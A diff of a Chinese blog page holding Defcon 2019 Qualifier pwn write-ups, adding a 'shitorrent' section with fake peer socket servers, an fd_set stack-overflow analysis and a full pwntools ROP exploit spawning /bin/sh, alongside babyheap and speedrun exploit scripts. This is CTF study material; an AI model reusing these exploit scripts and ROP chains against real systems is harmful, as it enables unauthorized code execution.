@@ -6,24 +6,34 @@
   <meta name="keywords" content=" Pwn , CTF , Defcon ">
   <meta name="description" content="Defcon2019Q | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
+<meta name="description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AFL基础">
-<meta property="og:url" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:title" content="Defcon2019Q">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/index.html">
 <meta property="og:site_name" content="风云阁">
-<meta property="og:description" content="[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021513499-6493565.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021916706.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022711028.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022730604.png">
-<meta property="article:published_time" content="2020-04-10T04:35:49.741Z">
-<meta property="article:modified_time" content="2020-04-10T04:40:24.139Z">
+<meta property="og:description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144618073.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145014084.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145057408.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145133505.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145207971.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145449340.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145541673.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145737954.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145839380.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144248741.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133959847.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133712725.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133700701.png">
+<meta property="article:published_time" content="2020-04-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-11T07:10:19.743Z">
 <meta property="article:author" content="枫云李">
-<meta property="article:tag" content="fuzz">
-<meta property="article:tag" content="afl">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Defcon">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
+<meta name="twitter:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
 
 
 <link rel="icon" href="/img/mac.png">
@@ -78,7 +88,15 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(18)</small></div></li>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            <li><div data-rel="CTF">CTF</div></li>
+        
+    
+        
+            <li><div data-rel="Fuzz">Fuzz</div></li>
+        
     
 </ul>
 <div class="left-bottom">
@@ -91,7 +109,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="18">
+<input type="hidden" id="yelog_site_posts_number" value="20">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -136,15 +154,15 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color4">CVE</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">Pwn</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CVE</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -165,7 +183,15 @@
     
     <nav id="title-list-nav">
         
-        <a  class=""
+        <a  class="CTF "
+           href="/2020/04/11/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2020-04-11 00:00:00">2020/04/11</span>
+        </a>
+        
+        <a  class="Fuzz "
            href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
            data-tag="fuzz,afl"
            data-author="" >
@@ -174,35 +200,43 @@
         </a>
         
         <a  class=""
-           href="/2020/04/09/Defcon2019Q/"
-           data-tag="Pwn,CTF,Defcon"
-           data-author="" >
-            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
-            <span class="post-date" title="2020-04-09 00:00:00">2020/04/09</span>
-        </a>
-        
-        <a  class=""
            href="/2020/04/05/CVEs/"
-           data-tag="CVE,Pwn"
+           data-tag="Pwn,CVE"
            data-author="" >
             <span class="post-title" title="CVEs">CVEs</span>
             <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
         </a>
         
-        <a  class=""
-           href="/2020/04/01/hello-world/"
+        <a  class="CTF "
+           href="/2020/02/10/NullConCTF2020/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2020-04-01 23:49:33">2020/04/01</span>
+            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
         </a>
         
-        <a  class=""
-           href="/2020/02/10/nullcon/"
+        <a  class="CTF "
+           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="nullcon">nullcon</span>
-            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+            <span class="post-title" title="强网杯2019">强网杯2019</span>
+            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/N1CTF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019">安洵杯2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
         </a>
         
         <a  class=""
@@ -219,6 +253,14 @@
            data-author="" >
             <span class="post-title" title="heap_details">heap_details</span>
             <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/10/12/RoarCTF-2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
+            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
         </a>
         
         <a  class=""
@@ -251,14 +293,6 @@
            data-author="" >
             <span class="post-title" title="git handbook">git handbook</span>
             <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
-        </a>
-        
-        <a  class=""
-           href="/2019/05/26/QWB/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="QWB">QWB</span>
-            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
         </a>
         
         <a  class=""
@@ -301,11 +335,11 @@
             <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
         </a>
         
-        <a  class=""
-           href="/2019/04/29/star_ctf/"
-           data-tag=""
+        <a  class="CTF "
+           href="/2019/04/29/StarCTF/"
+           data-tag="Pwn,CTF"
            data-author="" >
-            <span class="post-title" title="star_ctf">star_ctf</span>
+            <span class="post-title" title="StarCTF">StarCTF</span>
             <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
         </a>
         
@@ -329,6 +363,12 @@
         
         
         
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
         
         <span class="tag">
             
@@ -343,7 +383,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-04-09 13:42:50'>2020-04-09 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-11 15:10:19'>2020-04-11 00:00</time>
         
     </div>
     <div class="article-meta">
@@ -365,7 +405,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Defcon-Qual-2019"><span class="toc-text">Defcon Qual 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-009"><span class="toc-text">speedrun-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-text">babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-1"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-1"><span class="toc-text">speedrun-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-1"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning-1"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-2"><span class="toc-text">Pwned!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-02"><span class="toc-text">speedrun-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-07"><span class="toc-text">speedrun-07</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-2"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwning-2"><span class="toc-text">Pwning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned！"><span class="toc-text">Pwned！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-10"><span class="toc-text">speedrun-10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reversing-3"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwned-3"><span class="toc-text">Pwned!</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Defcon-Qual-2019-Pwn"><span class="toc-text">Defcon Qual 2019 Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shitorrent"><span class="toc-text">shitorrent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-009"><span class="toc-text">speedrun-009</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-text">babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-1"><span class="toc-text">speedrun-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-02"><span class="toc-text">speedrun-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-07"><span class="toc-text">speedrun-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-10"><span class="toc-text">speedrun-10</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -381,13 +421,212 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>[toc]</p>
-<h1 id="Defcon-Qual-2019"><a href="#Defcon-Qual-2019" class="headerlink" title="Defcon Qual 2019"></a>Defcon Qual 2019</h1><p>Defcon CTF 2020 5月就开赛了，复盘了一些去年的题目。</p>
-<p><img src="/2020/04/09/Defcon2019Q/image-20200409133508781.png" alt="image-20200409133508781"></p>
-<h2 id="speedrun-009"><a href="#speedrun-009" class="headerlink" title="speedrun-009"></a>speedrun-009</h2><p><img src="/2020/04/09/Defcon2019Q/image-20200409133959847.png" alt="程序保护检查"></p>
+        <p><div class='inner-toc'><h2>目录</h2><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Defcon-Qual-2019-Pwn"><span class="toc-text">Defcon Qual 2019 Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shitorrent"><span class="toc-text">shitorrent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-009"><span class="toc-text">speedrun-009</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-text">babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-1"><span class="toc-text">speedrun-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-02"><span class="toc-text">speedrun-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-07"><span class="toc-text">speedrun-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#speedrun-10"><span class="toc-text">speedrun-10</span></a></li></ol></li></ol></div></p>
+<h1 id="Defcon-Qual-2019-Pwn"><a href="#Defcon-Qual-2019-Pwn" class="headerlink" title="Defcon Qual 2019 Pwn"></a>Defcon Qual 2019 Pwn</h1><p><img src="/2020/04/11/Defcon2019Q/image-20200409133508781.png" alt="DEF CON CTF"></p>
+<h2 id="shitorrent"><a href="#shitorrent" class="headerlink" title="shitorrent"></a>shitorrent</h2><p><strong>题目描述</strong></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411144618073.png" alt></p>
+<p>22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。</p>
+<p><strong>分析程序</strong></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145014084.png" alt="静态链接"></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145057408.png" alt="检查保护"></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145133505.png" alt="程序功能"></p>
+<p>添加admin pc需要自己开启一个socket发送字符串 <code>TORADMIN</code> 。</p>
+<p>所以我开启了两个网络程序。</p>
+<pre><code>import socket 
+from time import sleep 
+import sys
+sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.bind((&#39;0.0.0.0&#39;,2332))
+sock.listen(100)
+cnt=0
+
+while True: 
+    print(&#39;listening ...&#39;)
+    try: 
+        csock,addr=sock.accept()
+    except KeyboardInterrupt:
+        csock.close()
+        print(&quot;Exited&quot;)
+        sys.exit(0)
+    print(&quot;Connected to &quot;,addr)
+    rp=csock.recv(100)
+    print(rp)
+    csock.send(b&#39;TORADMIN&#39;)
+    print(&quot;Send TORADMIN&quot;)
+    sleep(0.01)
+    csock.send(b&#39;i am admin,hacking u&#39;)
+    print(&quot;Send HACK #%d&quot;%cnt)
+    cnt += 1
+    csock.close()
+</code></pre><pre><code>import socket 
+from time import sleep 
+import sys
+sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.bind((&#39;0.0.0.0&#39;,2333))
+sock.listen(100)
+cnt=0
+
+while True: 
+    print(&#39;listening ...&#39;)
+    try: 
+        csock,addr=sock.accept()
+    except KeyboardInterrupt:
+        csock.close()
+        print(&quot;Exited&quot;)
+        sys.exit(0)
+    print(&quot;Connected to &quot;,addr)
+    rp=csock.recv(100)
+    print(rp)
+    csock.send(b&#39;LISTENER&#39;)
+    print(&quot;Send Listener&quot;)
+    sleep(0.01)
+    csock.send(b&#39;i am admin,hacking u&#39;)
+    print(&quot;Send HACK #%d&quot;%cnt)
+    cnt += 1
+    csock.close()
+</code></pre><p>仔细分析源码后，漏洞点锁定在 <code>FD_SET(scok,rfds)</code></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145207971.png" alt="add_node"></p>
+<p>vscode 跳进 FD_SET 定义</p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145449340.png" alt="宏定义"></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145541673.png" alt="struct fd_set"></p>
+<p>可以看出fds_bits有固定大小为1024 bits。通过标记相应位表示相应的fd正在占用。</p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145737954.png" alt></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411145839380.png" alt></p>
+<p>源码设置了fd上限为65536，fds变量空间在main函数栈上。生成多个fd使得fdset发生溢出。</p>
+<p><strong>攻击思路</strong></p>
+<ul>
+<li><input checked disabled type="checkbox"> 存在栈溢出，需要绕过canary，从源码可知，创建listener生成的sock，增加fd数量，但不会放入 fd_set。那么可先申请一批listener，这样就绕过canary了。</li>
+<li><input checked disabled type="checkbox"> 程序是静态链接的，ROPgadget找到ropchain</li>
+<li><input checked disabled type="checkbox"> ROP -&gt; Pwned!</li>
+<li><input checked disabled type="checkbox"> </li>
+</ul>
+<p><strong>Pwned!</strong></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200411144248741.png" alt></p>
+<p><strong>exp</strong></p>
+<pre><code>#!/usr/bin/env python
+#coding=utf8
+from pwn import * 
+import primedbg 
+import sys 
+from struct import pack
+
+# Padding goes here
+def ropchain():
+    p = &#39;&#39;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000407888) # pop rsi ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000006da0e0) # @ .data
+    p += pack(&#39;&lt;Q&#39;, 0x00000000004657fc) # pop rax ; ret
+    p += &#39;/bin//sh&#39;
+    p += pack(&#39;&lt;Q&#39;, 0x00000000004055c1) # mov qword ptr [rsi], rax ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000407888) # pop rsi ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000006da0e8) # @ .data + 8
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000460b90) # xor rax, rax ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000004055c1) # mov qword ptr [rsi], rax ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000400706) # pop rdi ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000006da0e0) # @ .data
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000407888) # pop rsi ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000006da0e8) # @ .data + 8
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000465855) # pop rdx ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000006da0e8) # @ .data + 8
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000460b90) # xor rax, rax ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490930) # add rax, 3; ret;
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490920) # add rax, 1 ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x0000000000490920) # add rax, 1 ; ret
+    p += pack(&#39;&lt;Q&#39;, 0x00000000004172e5) # syscall
+    #print(len(p))
+    res=[]
+    for byte in p:
+        num=ord(byte)
+        for i in range(8):
+            res.append(num&amp;1)
+            num=num&gt;&gt;1
+    success(&#39;bitmap len=%d&#39;%(len(res)))
+    #print(res)
+    return res
+
+context.arch=&#39;amd64&#39;
+io=process(&#39;./shitorrent&#39;)
+if len(sys.argv)==2 and sys.argv[1]==&#39;dbg&#39;:
+    primedbg.p_attach_dbg(io,[0x00000A3B])
+
+def add_pc(host):
+    global io
+    io.sendlineafter(&#39;flag&#39;,&#39;a&#39;)
+    io.sendlineafter(&#39;enter host\n&#39;,host[0])
+    io.sendlineafter(&#39;enter port&#39;,str(host[1]))
+
+def del_pc(fd):
+    global io 
+    io.sendlineafter(&#39;flag&#39;,&#39;r&#39;)
+    sleep(0.01)
+    io.sendline(str(fd))
+
+
+#0x0000000000400706: pop rdi; ret;
+
+def test():
+    admin=(&#39;134.175.229.111&#39;,2332)
+    admin2=(&#39;127.0.0.1&#39;,2332)
+    listener=(&#39;134.175.229.111&#39;,2333)
+    add_pc(admin2)
+
+    io.interactive()
+    pass
+
+def attack():
+    presize=0x98*8
+    bitmap=ropchain()
+    admin=(&#39;127.0.0.1&#39;,2332)
+    listener=(&#39;127.0.0.1&#39;,2333)
+    for i in range(presize-3):
+        if(i%8==0):
+            success(&#39;Byte[%d]&#39;%(i/8))
+        add_pc(listener)
+
+    bitmaplen=len(bitmap)
+    cnt=0
+    #set all bits
+    for i in bitmap:
+        if(cnt%8==0):
+            success(&#39;bitmap %d/%d&#39;%(cnt,bitmaplen))
+        add_pc(admin)
+        cnt +=1
+
+    #clear some bits
+    cnt=0
+    for i in bitmap:
+        if cnt%8==0:
+            success(&#39;bitmap %d/%d&#39;%(cnt,bitmaplen))
+        if i==0:
+            del_pc(presize+cnt)
+        cnt +=1
+
+    io.sendlineafter(&#39;flag&#39;,&#39;q&#39;)
+    io.interactive()
+
+if __name__==&#39;__main__&#39;:
+    attack()</code></pre><h2 id="speedrun-009"><a href="#speedrun-009" class="headerlink" title="speedrun-009"></a>speedrun-009</h2><p><img src="/2020/04/11/Defcon2019Q/image-20200409133959847.png" alt="程序保护检查"></p>
 <p>保护全开</p>
-<p><img src="/2020/04/09/Defcon2019Q/image-20200409133712725.png" alt="变量栈分布"></p>
-<p><img src="/2020/04/09/Defcon2019Q/image-20200409133700701.png" alt="漏洞点"></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200409133712725.png" alt="变量栈分布"></p>
+<p><img src="/2020/04/11/Defcon2019Q/image-20200409133700701.png" alt="漏洞点"></p>
 <p>格式化字符串漏洞、栈溢出</p>
 <p>攻击思路</p>
 <ul>
@@ -395,7 +634,8 @@
 <li><input checked disabled type="checkbox"> fmt 泄露<code>canary</code></li>
 <li><input checked disabled type="checkbox"> ROP 到<code>one_gadget</code></li>
 </ul>
-<h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code class="python">#!/usr/bin/env python
+<p><strong>Pwned!</strong></p>
+<pre><code class="python">#!/usr/bin/env python
 #coding=utf8
 from pwn import * 
 import primedbg 
@@ -444,7 +684,8 @@ if __name__==&#39;__main__&#39;:
     io.interactive()
 
 </code></pre>
-<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><pre><code>primelee@vmware Desktop/CTF/now % strings libc.so| grep &#39;release version&#39;                                                                                  22:16:19
+<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p><strong>Reversing</strong></p>
+<pre><code>primelee@vmware Desktop/CTF/now % strings libc.so| grep &#39;release version&#39;                                                                                  22:16:19
 GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.</code></pre><p>libc.so 版本 2.29</p>
 <pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   babyheap_new</code></pre><p>保护全开</p>
@@ -466,11 +707,13 @@ Command:
   }
   return 0LL;
 }</code></pre><p>一个字节溢出</p>
-<h3 id="Pwning"><a href="#Pwning" class="headerlink" title="Pwning"></a>Pwning</h3><ol>
+<p><strong>Pwning</strong></p>
+<ol>
 <li>填满 tcache list ， free chunk X 到 unsorted bin，再free下一个chunk 调用 unlink，合并到 top chunk ，malloc 7次清空tcache list，malloc 泄露 unsorted bin 地址得到 libc 基地址</li>
 <li>一个字节溢出改下一个 chunk B 的 size ，再次 malloc chunk B 可以覆盖下一个 chunk C ， 此时 chunk C 在 tcache list ，fd 被篡改为 free_hook ，malloc 两次写 one gadget 入 free_hook。</li>
 </ol>
-<h3 id="Pwned-1"><a href="#Pwned-1" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code class="python">#! /usr/bin/env python
+<p><strong>Pwned!</strong></p>
+<pre><code class="python">#! /usr/bin/env python
 from pwn import * 
 import sys
 
@@ -569,7 +812,8 @@ if __name__==&#39;__main__&#39;:
     free(io,0)  
 
     io.interactive()</code></pre>
-<h2 id="speedrun-1"><a href="#speedrun-1" class="headerlink" title="speedrun-1"></a>speedrun-1</h2><h3 id="Reversing-1"><a href="#Reversing-1" class="headerlink" title="Reversing"></a>Reversing</h3><pre><code>primelee@vmware Desktop/CTF/now % file speedrun-001 
+<h2 id="speedrun-1"><a href="#speedrun-1" class="headerlink" title="speedrun-1"></a>speedrun-1</h2><p><strong>Reversing</strong></p>
+<pre><code>primelee@vmware Desktop/CTF/now % file speedrun-001 
 speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
 
 primelee@vmware Desktop/CTF/now % checksec speedrun-001                                                                                               17:03:51
@@ -592,8 +836,10 @@ GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</code></pre><p>这样ubuntu版本就�
   _libc_read(0, &amp;buf, 0x7D0uLL);
   return sub_40F710((__int64)&quot;This will be the last thing that you say: %s\n&quot;, &amp;buf);
 }</code></pre><p>简单栈溢出</p>
-<h3 id="Pwning-1"><a href="#Pwning-1" class="headerlink" title="Pwning"></a>Pwning</h3><pre><code>primelee@vmware Desktop/CTF/now % ROPgadget --binary speedrun-001 --ropchain --silent&gt; ropchain</code></pre><p>ROPgadget 生成 system(“/bin/sh”) 的 ropchain 。</p>
-<h3 id="Pwned-2"><a href="#Pwned-2" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code>#!/usr/bin/env python2
+<p><strong>Pwning</strong></p>
+<pre><code>primelee@vmware Desktop/CTF/now % ROPgadget --binary speedrun-001 --ropchain --silent&gt; ropchain</code></pre><p>ROPgadget 生成 system(“/bin/sh”) 的 ropchain 。</p>
+<p><strong>Pwned!</strong></p>
+<pre><code>#!/usr/bin/env python2
 # execve generated by ROPgadget
 
 from pwn import *  
@@ -735,7 +981,8 @@ io.interactive()
 
 # 0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
 # constraints:
